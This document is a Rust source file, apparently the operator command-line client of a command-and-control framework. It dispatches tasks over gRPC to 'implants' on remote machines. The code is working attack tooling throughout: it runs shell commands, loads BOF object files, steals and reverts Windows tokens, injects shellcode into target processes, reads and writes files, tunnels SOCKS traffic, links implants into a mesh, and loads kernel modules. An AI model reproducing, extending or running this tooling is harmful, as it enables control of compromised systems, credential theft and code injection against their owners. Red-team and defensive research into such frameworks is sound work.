//! Simple CLI to dispatch tasks to implants
//! Usage: task <implant-id-hex> shell <command>
//!        task <implant-id-hex> bof <path-to-bof.o>
//!        task <implant-id-hex> mesh listen <port>
//!        task <implant-id-hex> mesh connect <peer-id-hex> <address> <port>
//!        task <implant-id-hex> mesh status
//!        task <implant-id-hex> token list
//!        task <implant-id-hex> token steal <pid>
//!        task <implant-id-hex> token rev2self
//!        task <implant-id-hex> inject <pid> <shellcode-hex-or-file>

use anyhow::Result;
use prost::Message;
use tonic::transport::Channel;

use protocol::{
    task_service_client::TaskServiceClient, BofTask, DispatchTaskRequest, MeshConnect,
    MeshGetTopology, MeshListen, MeshTask, MeshTransportType, ShellTask, Uuid, mesh_task,
    TokenTask, token_task, TokenSteal, TokenList, InjectTask, InjectionMethod,
    FileTask, file_task, FileList, FileRead, FileWrite,
    SocksTask, socks_task, SocksConnect, SocksDisconnect,
    ModuleTask, module_task, ModuleList, ModuleLoad, ModuleUnload,
};

#[tokio::main]
async fn main() -> Result<()> {
    let args: Vec<String> = std::env::args().collect();

    if args.len() < 4 {
        eprintln!("Usage: {} <implant-id-hex> shell <command>", args[0]);
        eprintln!("       {} <implant-id-hex> bof <path-to-bof.o>", args[0]);
        eprintln!("       {} <implant-id-hex> mesh listen <port>", args[0]);
        eprintln!("       {} <implant-id-hex> mesh connect <peer-id-hex> <address> <port>", args[0]);
        eprintln!("       {} <implant-id-hex> mesh status", args[0]);
        eprintln!("       {} <implant-id-hex> token list", args[0]);
        eprintln!("       {} <implant-id-hex> token steal <pid>", args[0]);
        eprintln!("       {} <implant-id-hex> token rev2self", args[0]);
        eprintln!("       {} <implant-id-hex> inject <pid> <shellcode-file>", args[0]);
        eprintln!("       {} <implant-id-hex> file list <path>", args[0]);
        eprintln!("       {} <implant-id-hex> file read <path>", args[0]);
        eprintln!("       {} <implant-id-hex> file write <path> <data>", args[0]);
        eprintln!("       {} <implant-id-hex> socks connect <channel> <host> <port>", args[0]);
        eprintln!("       {} <implant-id-hex> socks disconnect <channel>", args[0]);
        eprintln!("       {} <implant-id-hex> module list", args[0]);
        eprintln!("       {} <implant-id-hex> module load <path-to-kmod>", args[0]);
        eprintln!("       {} <implant-id-hex> module unload <module-id>", args[0]);
        eprintln!();
        eprintln!("Examples:");
        eprintln!("  {} D6FD48E4DF2742219B983197636F7B58 shell whoami", args[0]);
        eprintln!("  {} D6FD48E4DF2742219B983197636F7B58 bof ./hello.o", args[0]);
        eprintln!("  {} D6FD48E4DF2742219B983197636F7B58 mesh listen 9999", args[0]);
        eprintln!("  {} D6FD48E4DF2742219B983197636F7B58 mesh connect AABBCCDD... 127.0.0.1 9999", args[0]);
        eprintln!("  {} D6FD48E4DF2742219B983197636F7B58 mesh status", args[0]);
        eprintln!("  {} D6FD48E4DF2742219B983197636F7B58 token list", args[0]);
        eprintln!("  {} D6FD48E4DF2742219B983197636F7B58 token steal 1234", args[0]);
        eprintln!("  {} D6FD48E4DF2742219B983197636F7B58 inject 1234 ./shellcode.bin", args[0]);
        eprintln!("  {} D6FD48E4DF2742219B983197636F7B58 file list C:\\Users", args[0]);
        eprintln!("  {} D6FD48E4DF2742219B983197636F7B58 file read C:\\Windows\\System32\\drivers\\etc\\hosts", args[0]);
        std::process::exit(1);
    }

    let implant_id_hex = &args[1];
    let task_type = &args[2];
    let command = args[3..].join(" ");

    // Parse implant ID from hex
    let id_bytes = hex::decode(implant_id_hex)?;
    if id_bytes.len() != 16 {
        anyhow::bail!("implant ID must be 32 hex characters (16 bytes)");
    }

    // Connect to server
    let channel = Channel::from_static("http://127.0.0.1:50051")
        .connect()
        .await?;
    let mut client = TaskServiceClient::new(channel);

    match task_type.as_str() {
        "shell" => {
            let shell_task = ShellTask {
                command: command.clone(),
                shell: None,
                timeout_ms: Some(30000),
            };
            let task_data = shell_task.encode_to_vec();

            let request = tonic::Request::new(DispatchTaskRequest {
                implant_id: Some(Uuid { value: id_bytes }),
                task_type: "shell".to_string(),
                task_data,
            });

            println!("Dispatching shell command: {}", command);
            let response = client.dispatch_task(request).await?;
            let task_id = response
                .into_inner()
                .task_id
                .map(|u| hex::encode(u.value))
                .unwrap_or_else(|| "unknown".to_string());
            println!("Task dispatched! ID: {}", task_id);
        }
        "bof" => {
            let bof_path = &command; // command contains the path for bof
            let bof_data = std::fs::read(bof_path)?;
            println!("Loading BOF from: {} ({} bytes)", bof_path, bof_data.len());

            let bof_task = BofTask {
                bof_data,
                entry_point: None, // default "go"
                arguments: None,
            };
            let task_data = bof_task.encode_to_vec();

            let request = tonic::Request::new(DispatchTaskRequest {
                implant_id: Some(Uuid { value: id_bytes }),
                task_type: "bof".to_string(),
                task_data,
            });

            println!("Dispatching BOF task...");
            let response = client.dispatch_task(request).await?;
            let task_id = response
                .into_inner()
                .task_id
                .map(|u| hex::encode(u.value))
                .unwrap_or_else(|| "unknown".to_string());
            println!("Task dispatched! ID: {}", task_id);
        }
        "mesh" => {
            let mesh_subcommand = args.get(3).map(|s| s.as_str()).unwrap_or("");
            let mesh_task = match mesh_subcommand {
                "listen" => {
                    let port: u32 = args
                        .get(4)
                        .ok_or_else(|| anyhow::anyhow!("Usage: mesh listen <port>"))?
                        .parse()?;
                    println!("Dispatching mesh listen on port {}", port);
                    MeshTask {
                        operation: Some(mesh_task::Operation::Listen(MeshListen {
                            port,
                            transport: MeshTransportType::MeshTransportTcp as i32,
                            bind_address: "0.0.0.0".to_string(),
                            pipe_name: String::new(),
                        })),
                    }
                }
                "connect" => {
                    let peer_id_hex = args
                        .get(4)
                        .ok_or_else(|| anyhow::anyhow!("Usage: mesh connect <peer-id-hex> <address> <port>"))?;
                    let address = args
                        .get(5)
                        .ok_or_else(|| anyhow::anyhow!("Usage: mesh connect <peer-id-hex> <address> <port>"))?
                        .clone();
                    let port: u32 = args
                        .get(6)
                        .ok_or_else(|| anyhow::anyhow!("Usage: mesh connect <peer-id-hex> <address> <port>"))?
                        .parse()?;
                    let peer_bytes = hex::decode(peer_id_hex)?;
                    if peer_bytes.len() != 16 {
                        anyhow::bail!("peer ID must be 32 hex characters (16 bytes)");
                    }
                    println!("Dispatching mesh connect to peer {} at {}:{}", peer_id_hex, address, port);
                    MeshTask {
                        operation: Some(mesh_task::Operation::Connect(MeshConnect {
                            peer_id: peer_bytes,
                            transport: MeshTransportType::MeshTransportTcp as i32,
                            address,
                            port,
                            pipe_name: String::new(),
                            peer_public_key: vec![],
                        })),
                    }
                }
                "status" => {
                    println!("Dispatching mesh status (get topology)");
                    MeshTask {
                        operation: Some(mesh_task::Operation::GetTopology(MeshGetTopology {})),
                    }
                }
                _ => {
                    anyhow::bail!(
                        "Unknown mesh subcommand: {}. Supported: listen, connect, status",
                        mesh_subcommand
                    );
                }
            };
            let task_data = mesh_task.encode_to_vec();
            let request = tonic::Request::new(DispatchTaskRequest {
                implant_id: Some(Uuid { value: id_bytes }),
                task_type: "mesh".to_string(),
                task_data,
            });
            let response = client.dispatch_task(request).await?;
            let task_id = response
                .into_inner()
                .task_id
                .map(|u| hex::encode(u.value))
                .unwrap_or_else(|| "unknown".to_string());
            println!("Task dispatched! ID: {}", task_id);
        }
        "token" => {
            let token_subcommand = args.get(3).map(|s| s.as_str()).unwrap_or("");
            let token_task = match token_subcommand {
                "list" => {
                    println!("Dispatching token list");
                    TokenTask {
                        operation: Some(token_task::Operation::List(TokenList {})),
                    }
                }
                "steal" => {
                    let pid: u32 = args
                        .get(4)
                        .ok_or_else(|| anyhow::anyhow!("Usage: token steal <pid>"))?
                        .parse()?;
                    println!("Dispatching token steal from PID {}", pid);
                    TokenTask {
                        operation: Some(token_task::Operation::Steal(TokenSteal { target_pid: pid })),
                    }
                }
                "rev2self" => {
                    println!("Dispatching token rev2self");
                    TokenTask {
                        operation: Some(token_task::Operation::Rev2self(protocol::TokenRevSelf {})),
                    }
                }
                _ => {
                    anyhow::bail!(
                        "Unknown token subcommand: {}. Supported: list, steal, rev2self",
                        token_subcommand
                    );
                }
            };
            let task_data = token_task.encode_to_vec();
            let request = tonic::Request::new(DispatchTaskRequest {
                implant_id: Some(Uuid { value: id_bytes }),
                task_type: "token".to_string(),
                task_data,
            });
            let response = client.dispatch_task(request).await?;
            let task_id = response
                .into_inner()
                .task_id
                .map(|u| hex::encode(u.value))
                .unwrap_or_else(|| "unknown".to_string());
            println!("Task dispatched! ID: {}", task_id);
        }
        "inject" => {
            let pid: u32 = args
                .get(3)
                .ok_or_else(|| anyhow::anyhow!("Usage: inject <pid> <shellcode-file>"))?
                .parse()?;
            let shellcode_path = args
                .get(4)
                .ok_or_else(|| anyhow::anyhow!("Usage: inject <pid> <shellcode-file>"))?;
            let shellcode = std::fs::read(shellcode_path)?;
            println!("Dispatching inject to PID {} with {} bytes shellcode", pid, shellcode.len());

            let inject_task = InjectTask {
                target_pid: pid,
                shellcode,
                method: InjectionMethod::Auto as i32,
                wait: false,
                timeout_ms: 30000,
                parent_pid: None,
            };
            let task_data = inject_task.encode_to_vec();
            let request = tonic::Request::new(DispatchTaskRequest {
                implant_id: Some(Uuid { value: id_bytes }),
                task_type: "inject".to_string(),
                task_data,
            });
            let response = client.dispatch_task(request).await?;
            let task_id = response
                .into_inner()
                .task_id
                .map(|u| hex::encode(u.value))
                .unwrap_or_else(|| "unknown".to_string());
            println!("Task dispatched! ID: {}", task_id);
        }
        "socks" => {
            let socks_subcommand = args.get(3).map(|s| s.as_str()).unwrap_or("");
            let socks_task = match socks_subcommand {
                "connect" => {
                    let channel: u32 = args
                        .get(4)
                        .ok_or_else(|| anyhow::anyhow!("Usage: socks connect <channel> <host> <port>"))?
                        .parse()?;
                    let host = args
                        .get(5)
                        .ok_or_else(|| anyhow::anyhow!("Usage: socks connect <channel> <host> <port>"))?
                        .clone();
                    let port: u32 = args
                        .get(6)
                        .ok_or_else(|| anyhow::anyhow!("Usage: socks connect <channel> <host> <port>"))?
                        .parse()?;
                    println!("Dispatching socks connect: channel {} to {}:{}", channel, host, port);
                    SocksTask {
                        operation: Some(socks_task::Operation::Connect(SocksConnect {
                            channel_id: channel,
                            target_host: host,
                            target_port: port,
                        })),
                    }
                }
                "disconnect" => {
                    let channel: u32 = args
                        .get(4)
                        .ok_or_else(|| anyhow::anyhow!("Usage: socks disconnect <channel>"))?
                        .parse()?;
                    println!("Dispatching socks disconnect: channel {}", channel);
                    SocksTask {
                        operation: Some(socks_task::Operation::Disconnect(SocksDisconnect {
                            channel_id: channel,
                        })),
                    }
                }
                _ => {
                    anyhow::bail!(
                        "Unknown socks subcommand: {}. Supported: connect, disconnect",
                        socks_subcommand
                    );
                }
            };
            let task_data = socks_task.encode_to_vec();
            let request = tonic::Request::new(DispatchTaskRequest {
                implant_id: Some(Uuid { value: id_bytes }),
                task_type: "socks".to_string(),
                task_data,
            });
            let response = client.dispatch_task(request).await?;
            let task_id = response
                .into_inner()
                .task_id
                .map(|u| hex::encode(u.value))
                .unwrap_or_else(|| "unknown".to_string());
            println!("Task dispatched! ID: {}", task_id);
        }
        "file" => {
            let file_subcommand = args.get(3).map(|s| s.as_str()).unwrap_or("");
            let file_task = match file_subcommand {
                "list" => {
                    let path = args
                        .get(4)
                        .ok_or_else(|| anyhow::anyhow!("Usage: file list <path>"))?
                        .clone();
                    println!("Dispatching file list: {}", path);
                    FileTask {
                        operation: Some(file_task::Operation::List(FileList {
                            path,
                            recursive: false,
                        })),
                    }
                }
                "read" => {
                    let path = args
                        .get(4)
                        .ok_or_else(|| anyhow::anyhow!("Usage: file read <path>"))?
                        .clone();
                    println!("Dispatching file read: {}", path);
                    FileTask {
                        operation: Some(file_task::Operation::Read(FileRead {
                            path,
                            offset: None,
                            length: None,
                        })),
                    }
                }
                "write" => {
                    let path = args
                        .get(4)
                        .ok_or_else(|| anyhow::anyhow!("Usage: file write <path> <data>"))?
                        .clone();
                    let data = args[5..].join(" ");
                    println!("Dispatching file write: {} ({} bytes)", path, data.len());
                    FileTask {
                        operation: Some(file_task::Operation::Write(FileWrite {
                            path,
                            data: data.into_bytes(),
                            append: false,
                        })),
                    }
                }
                _ => {
                    anyhow::bail!(
                        "Unknown file subcommand: {}. Supported: list, read, write",
                        file_subcommand
                    );
                }
            };
            let task_data = file_task.encode_to_vec();
            let request = tonic::Request::new(DispatchTaskRequest {
                implant_id: Some(Uuid { value: id_bytes }),
                task_type: "file".to_string(),
                task_data,
            });
            let response = client.dispatch_task(request).await?;
            let task_id = response
                .into_inner()
                .task_id
                .map(|u| hex::encode(u.value))
                .unwrap_or_else(|| "unknown".to_string());
            println!("Task dispatched! ID: {}", task_id);
        }
        "module" => {
            let module_subcommand = args.get(3).map(|s| s.as_str()).unwrap_or("");
            let module_task = match module_subcommand {
                "list" => {
                    println!("Dispatching module list");
                    ModuleTask {
                        operation: Some(module_task::Operation::List(ModuleList {})),
                    }
                }
                "load" => {
                    let blob_path = args
                        .get(4)
                        .ok_or_else(|| anyhow::anyhow!("Usage: module load <path-to-kmod>"))?;
                    let blob = std::fs::read(blob_path)?;
                    println!("Dispatching module load: {} ({} bytes)", blob_path, blob.len());
                    ModuleTask {
                        operation: Some(module_task::Operation::Load(ModuleLoad {
                            module_blob: blob,
                        })),
                    }
                }
                "unload" => {
                    let module_id = args
                        .get(4)
                        .ok_or_else(|| anyhow::anyhow!("Usage: module unload <module-id>"))?
                        .clone();
                    println!("Dispatching module unload: {}", module_id);
                    ModuleTask {
                        operation: Some(module_task::Operation::Unload(ModuleUnload {
                            module_id,
                        })),
                    }
                }
                _ => {
                    anyhow::bail!(
                        "Unknown module subcommand: {}. Supported: list, load, unload",
                        module_subcommand
                    );
                }
            };
            let task_data = module_task.encode_to_vec();
            let request = tonic::Request::new(DispatchTaskRequest {
                implant_id: Some(Uuid { value: id_bytes }),
                task_type: "module".to_string(),
                task_data,
            });
            let response = client.dispatch_task(request).await?;
            let task_id = response
                .into_inner()
                .task_id
                .map(|u| hex::encode(u.value))
                .unwrap_or_else(|| "unknown".to_string());
            println!("Task dispatched! ID: {}", task_id);
        }
        _ => {
            anyhow::bail!("Unknown task type: {}. Supported: shell, bof, mesh, token, inject, file, socks, module", task_type);
        }
    }

    Ok(())
}
